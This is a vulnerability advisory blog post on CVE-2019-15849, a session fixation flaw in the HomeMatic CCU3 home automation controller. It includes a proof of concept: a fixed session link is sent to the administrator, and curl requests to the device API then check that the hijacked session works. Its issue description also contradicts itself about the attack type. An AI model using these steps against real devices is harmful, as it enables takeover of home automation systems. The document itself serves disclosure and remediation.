---
layout: post
title: "Session Fixation in HomeMatic CCU3"
date: 2019-09-14 09:00:00
image:
      url: /assets/pixabay/matrix-1799659_1920.jpg
author: 'Joshua Lehr'
author_image: "https://avatars1.githubusercontent.com/u/22133182?s=400&u=9c37c0c25738af0b47f4b2ab1c3adb0b26f80abf&v=4"
author_link: "https://github.com/noskill1337"
cve: "CVE-2019-15849"
cve_description: "HomeMatic CCU3 firmware 3.41.11 has a session fix vulnerability. An attacker can create a session ID and send it to the victim. After the victim log in to the WebUI, the attacker can use his session. The attacker could create a SSH login via the WebUI and easily compromise the system."
cve_affectedVersion: "3.41.11"
cvss: "7.4"
cvss_vector: "3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N"
softwarePatchLink: "Update to the current version 3.47.15 or above"
---

## Overview

- Vulnerability: Session Fixation
- Vendor: eQ-3 AG
- Vendor Homepage: [https://www.eq-3.com/contact.html](https://www.eq-3.com/contact.html)
- Product: HomeMatic central CCU3
- Version: {{ page.cve_affectedVersion }}

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's [website](https://www.homematic-ip.com/produkte/detail/smart-home-zentrale-ccu3.html):
"The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). ..."

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Session Fixation vulnerability has been identified, which can be exploited in order to display sensitive information. The vulnerability is in the central CCU3 firmware {{ page.cve_affectedVersion }}.

![Affected Version](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface. The flaw allows the attacker to display secret files on the system.

The following **process flow** illustrates this approach:

### Get initial Session ID (SID)

1. Open WebUI login in browser: http://192.168.0.125/login.htm
2. HomeMatic will create and add the session ID to the URL parameter:

~~~ text
http://192.168.0.125/login.htm?sid=@s8JJ2bEJOr@
~~~

![Initial Session creation](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.InitialSession.JPG)

### The session will not work without a successful login

1. To check this, execute the following **curl command** on the attacker site:

~~~ bash
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@s8JJ2bEJOr@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 84' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"Event.poll\", \"params\": {\"_session_id_\": \"Hv4TQtaXO8\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'
~~~

The **curl Response** is:

~~~ http
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 156
Connection: close
Date: Sun, 01 Sep 2019 16:51:11 GMT
Server: lighttpd/1.4.50

{
  "version": "1.1",
  "result": null,
  "error": {
    "name": "JSONRPCError",
    "code": 400,
    "message": "access denied (\"GUEST\" needed 0)"
  }
}
~~~

In the JSON response you can see the message "access denied (\"GUEST\" needed 0)". This means the session is not valid yet.

### Get a active session with admin rights

~~~ bash
1. Send Link "http://192.168.0.125/login.htm?sid=@s8JJ2bEJOr@" to the administrator 
2. Wait for victim login ...
~~~

### Recheck if the session is valid yet (same request from step 2)

1. To check this, execute the following **curl command** on the attacker site:

~~~ bash
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@s8JJ2bEJOr@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 84' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"Event.poll\", \"params\": {\"_session_id_\": \"Hv4TQtaXO8\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'
~~~

The **curl Response** is:

~~~ http
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 45
Connection: close
Date: Sun, 01 Sep 2019 16:49:29 GMT
Server: lighttpd/1.4.50
~~~

**Congratulations - Now you have a valid session**
![Initial Session creation](/assets/CVE-2019-15849/CVE-2019-15849.HomeMatic.LoggedIn.JPG)

## Impact

This vulnerability affects the confidentiality of the system. This allows an attacker to create and read the session ID's. If an attacker is aware of the security issue, he or she may will attack the system by sending the user (admin) a link with a session ID. After a successful login of the victim, the attacker can use his session to manipulate the system. With this vulnerability flow, a complete system compromise is possible.

## Remediation

In order to avoid this vulnerability, it's suggested to disable the WebUI of HomeMatic. The HomeMatic-WebUI have many other security issues.

{%if page.softwarePatchLink %}{{ site.softwarePatchText }}{{ page.softwarePatchLink }}{% else %}{{ "" }}{% endif %}

## CVE

- CVE: [{{ page.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.cve }})
- CVSS Base Score: **{{ page.cvss }}**
- CVSS: {{ page.cvss_vector }}

## Credit

- {{ site.owner }}

## Vulnerability Disclosure Timeline

- 2019-September-01: Discovered vulnerability
- 2019-September-04: Vendor Notification
- 2019-September-10: Vendor Response/Feedback
- 2019-September-14: Public Disclosure

## Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community's understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 {{ site.owner }} and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

{{ site.LicenseDisplay }}